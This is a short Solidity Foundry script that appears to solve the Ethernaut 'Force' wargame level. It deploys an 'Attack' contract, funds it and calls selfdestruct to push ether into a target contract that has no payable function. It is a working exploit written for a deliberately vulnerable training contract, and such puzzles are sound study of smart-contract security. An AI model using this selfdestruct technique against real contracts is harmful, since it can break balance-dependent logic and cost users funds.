// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Force.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract Attack {
    Force force = Force(0x5E88dAc166Bdf290B8EF164cfBFC99EfF8F73b4F);
    function destruct() external payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }

    fallback() external payable {}
}

contract ForceSolution is Script {
    function run() external payable {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();
        (bool sent, bytes memory data) = payable(address(attack)).call{
            value: 10000
        }("");
        require(sent, "Failed to send Ether");
        attack.destruct();
    }
}
